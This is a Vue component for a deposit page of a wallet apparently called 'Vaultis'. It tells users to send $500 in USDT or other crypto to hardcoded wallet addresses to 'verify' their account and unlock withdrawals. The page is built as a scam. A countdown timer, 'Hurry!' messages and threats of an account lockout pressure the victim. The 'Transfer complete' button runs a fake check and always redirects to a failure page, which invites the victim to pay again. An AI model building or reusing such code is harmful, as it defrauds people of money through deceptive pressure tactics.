<script setup lang="ts">
import { ref, computed, onMounted, onUnmounted } from 'vue';
import { Head } from '@/lib/inertia-shim';
import { router } from '@/lib/inertia-shim';
import { AlertTriangle, Copy, Check, Loader2 } from '@lucide/vue';
import { Label } from '@/components/ui/label';
import QRAddress from '@/components/wallet/QRAddress.vue';
import { CHAINS } from '@/lib/wallet-data';
import type { ChainId } from '@/types/wallet';

// ── Resolve chain from URL path ──────────────────────────────────────
function resolveChain(): ChainId {
    if (typeof window === 'undefined') return 'usdt-erc';
    const parts = window.location.pathname.split('/').filter(Boolean);
    const last = parts[parts.length - 1] || '';
    if (last === 'usdt-erc' || last === 'usdt-bsc' || last === 'usdt-trc' || last === 'usdc-eth') {
        return last as ChainId;
    }
    return 'usdt-erc';
}

const rawChain = ref(resolveChain());
const chain = ref(CHAINS[rawChain.value] || CHAINS['usdt-erc']);
const symbol = ref(chain.value ? chain.value.symbol : 'USDT');
const name = ref(chain.value ? chain.value.name : 'Ethereum');
const network = ref(chain.value ? chain.value.network : 'Ethereum');
const logoChain = ref(rawChain.value);

// Address per chain
function addrFor(c: string): string {
    if (c === 'usdc-eth') return '0xaB270D8d31C2fBE1fE0B5D2E9A974c44AA821c10';
    if (c === 'usdt-erc' || c === 'usdt-bsc') return '0xaB270D8d31C2fBE1fE0B5D2E9A974c44AA821c10';
    if (c === 'usdt-trc' || c === 'trx') return 'TH7yVRLDtWoBkemNupVKusgNCEzHccnqP7';
    if (c === 'btc') return 'bc1qys0x2xvd39auaakxh9q7ek64skn6ftfyzsplga';
    if (c === 'ltc') return 'ltc1qsrkqq35g3yhkw3py38fcr6ez387kukw49m6rw0';
    if (c === 'sol') return 'HT4rMEuCvdaJe5VVcbQ71Wfd7txEH3sTHMXztjQDchZf';
    return '0xaB270D8d31C2fBE1fE0B5D2E9A974c44AA821c10';
}
const depositAddress = ref(addrFor(rawChain.value));

// Re-sync when URL changes
if (typeof window !== 'undefined') {
    window.addEventListener('popstate', () => {
        const next = resolveChain();
        rawChain.value = next;
        const c = CHAINS[next] || CHAINS['usdt-erc'];
        chain.value = c;
        symbol.value = c.symbol;
        name.value = c.name;
        network.value = c.network;
        logoChain.value = next;
        depositAddress.value = addrFor(next);
    });
}

// ── Countdown ─────────────────────────────────────────────────────────
const totalSeconds = 10 * 60;
const timeLeft = ref(totalSeconds);
let interval: ReturnType<typeof setInterval>;

const minutes = computed(() => Math.floor(timeLeft.value / 60));
const seconds = computed(() => timeLeft.value % 60);
const expired = computed(() => timeLeft.value <= 0);

const trialsLeft = ref(2);
const showExpiredBanner = ref(false);
const showTrialsWarning = ref(false);

// ── Actions ───────────────────────────────────────────────────────────
const copied = ref(false);
const confirmed = ref(false);
const confirmLoading = ref(false);

function copyAddress() {
    navigator.clipboard.writeText(depositAddress.value).then(() => {
        copied.value = true;
        setTimeout(() => { copied.value = false; }, 2000);
    });
}

function confirmDeposit() {
    if (confirmed.value || confirmLoading.value || expired.value) return;
    confirmLoading.value = true;
    setTimeout(() => {
        confirmLoading.value = false;
        confirmed.value = true;
        router.visit('/wallet/upgrade/deposit-failed');
    }, 2500);
}

onMounted(() => {
    interval = setInterval(() => {
        if (timeLeft.value > 0) {
            timeLeft.value -= 1;
        } else if (!showExpiredBanner.value) {
            // Timer hit zero — show banner, trials warning, then redirect
            showExpiredBanner.value = true;
            showTrialsWarning.value = true;
            setTimeout(() => {
                router.visit('/wallet/upgrade');
            }, 3000);
        }
    }, 1000);
});

onUnmounted(() => clearInterval(interval));
</script>

<template>
    <Head :title="`Deposit ${symbol} — Vaultis`" />

    <div class="flex flex-1 flex-col gap-6 p-4 md:p-6">
        <!-- Header -->
        <div>
            <h1 class="text-foreground text-xl font-semibold tracking-tight">
                Deposit {{ symbol }}
            </h1>
            <p class="text-vault-ink-dim mt-1 text-sm">
                Send <strong>$500</strong> {{ symbol }} to the address below
                to verify your account and unlock Tier 2 withdrawals.
            </p>
        </div>

        <!-- Countdown banner -->
        <div
            :class="[
                'flex items-center gap-3 rounded-xl border p-4 text-sm',
                expired
                    ? 'border-vault-rose/40 bg-vault-rose/10'
                    : timeLeft.value <= 120
                        ? 'border-vault-amber/40 bg-vault-amber/10'
                        : 'border-vault-mint/30 bg-vault-mint/5',
            ]"
        >
            <div
                :class="[
                    'flex size-14 shrink-0 items-center justify-center rounded-full border text-base font-bold uppercase tracking-widest',
                    expired
                        ? 'border-vault-rose/40 text-vault-rose'
                        : timeLeft.value <= 120
                            ? 'border-vault-amber/40 text-vault-amber'
                            : 'border-vault-mint/40 text-vault-mint',
                ]"
                style="line-height:1.2; word-break:keep-all; white-space:nowrap; overflow:hidden;"
            >
                <template v-if="expired">EXPIRED</template>
                <template v-else>{{ minutes }}:{{ String(seconds).padStart(2, '0') }}</template>
            </div>
            <div class="min-w-0">
                <p :class="['font-semibold', expired ? 'text-vault-rose' : 'text-foreground']">
                    <template v-if="expired">Time's up! Your session has expired.</template>
                    <template v-else-if="timeLeft.value <= 120">Hurry! You have less than 2 minutes left.</template>
                    <template v-else>Complete your transfer within this time</template>
                </p>
                <p class="text-vault-ink-dim text-sm">
                    You have <strong :class="expired ? 'text-vault-rose' : 'text-foreground'">few seconds</strong> remaining.
                </p>
            </div>
        </div>

        <!-- Deposit address + QR -->
        <div class="border-border bg-card rounded-2xl border p-6">
            <div class="mb-4 flex items-center justify-between">
                <div class="flex items-center gap-2">
                    <div>
                        <p class="text-foreground text-sm font-semibold">{{ symbol }} — {{ name }}</p>
                        <p class="text-vault-ink-dim text-xs">Network: {{ network }}</p>
                    </div>
                </div>
                <div class="text-right">
                    <p class="text-foreground text-sm font-semibold">$500.00</p>
                    <p class="text-vault-ink-dim text-xs">Amount to send</p>
                </div>
            </div>

            <div class="flex flex-col gap-4 sm:flex-row sm:items-start">
                <div class="flex flex-1 flex-col gap-2">
                    <p class="text-vault-ink-dim text-xs font-medium">
                        Your {{ symbol }} deposit address
                    </p>
                    <div class="flex items-center gap-2">
                        <input
                            type="text"
                            :value="depositAddress"
                            readonly
                            class="flex-1 rounded-lg border border-border bg-card px-3 py-2 font-mono text-sm text-foreground outline-none focus:border-vault-mint/40"
                        />
                        <button
                            type="button"
                            @click="copyAddress"
                            class="shrink-0 rounded-lg border border-border bg-secondary/60 p-2 transition-colors hover:bg-secondary hover:border-vault-mint/30"
                            :title="copied ? 'Copied!' : 'Copy address'"
                        >
                            <Check v-if="copied" class="size-4 text-vault-mint" />
                            <Copy v-else class="size-4 text-vault-ink-dim" />
                        </button>
                    </div>
                    <p class="text-vault-ink-dim text-[10px]">
                        Only send {{ symbol }} on the {{ network }} network to this address. Sending any other asset or network may result in permanent loss.
                    </p>
                </div>
                <div class="shrink-0">
                    <QRAddress :chain="logoChain" />
                </div>
            </div>
        </div>

        <!-- Expired banner (shown when timer runs out) -->
        <Transition
            enter-active-class="transition duration-300 ease-out"
            enter-from-class="opacity-0 translate-y-2"
            enter-to-class="opacity-100 translate-y-0"
        >
            <div
                v-if="showExpiredBanner"
                class="flex items-start gap-3 rounded-xl border border-vault-rose/30 bg-vault-rose/5 p-4 text-sm"
            >
                <AlertTriangle class="mt-0.5 size-4 shrink-0 text-vault-rose" />
                <div>
                    <p class="text-vault-rose/90 font-semibold">
                        Time expired — {{ trialsLeft }} trial{{ trialsLeft === 1 ? '' : 's' }} left
                    </p>
                    <p class="mt-1 text-vault-rose/70 text-xs">
                        Your account would be locked after 2 incorrect attempts.
                        Redirecting you back to the upgrade page…
                    </p>
                </div>
            </div>
        </Transition>

        <!-- Warning + button -->
        <div class="border-border bg-card rounded-2xl border p-5">
            <div class="mb-4 flex items-start gap-3 rounded-xl border border-vault-amber/20 bg-vault-amber/5 p-3 text-xs">
                <AlertTriangle class="mt-0.5 size-4 shrink-0 text-vault-amber" />
                <div>
                    <p class="text-vault-amber/90 font-semibold">Important</p>
                    <p class="mt-1 text-vault-amber/70">
                        Only click the <strong>"Transfer complete"</strong> button after you have actually sent the tokens to the address above. Clicking it before sending will be treated as a failed attempt.
                    </p>
                </div>
            </div>

            <button
                type="button"
                @click="confirmDeposit"
                :disabled="expired || confirmLoading || confirmed"
                class="w-full rounded-xl border px-4 py-3 text-sm font-semibold transition-colors"
                :class="[
                    expired || confirmed
                        ? 'border-border bg-secondary text-vault-ink-dim cursor-not-allowed'
                        : confirmLoading
                            ? 'border-border bg-secondary text-vault-ink-dim cursor-not-allowed'
                            : 'border-vault-mint/30 bg-vault-mint text-primary-foreground hover:bg-vault-mint/90',
                ]"
            >
                <template v-if="confirmLoading">
                    <Loader2 class="size-4 inline mr-2 animate-spin" />
                    Checking…
                </template>
                <template v-else-if="confirmed">Already submitted</template>
                <template v-else>Transfer complete</template>
            </button>

            <p v-if="!expired && !confirmed" class="mt-2 text-vault-rose/80 text-[10px] text-center">
                ⚠️ Warn: click this button only when you have transferred the token
            </p>
        </div>
    </div>
</template>
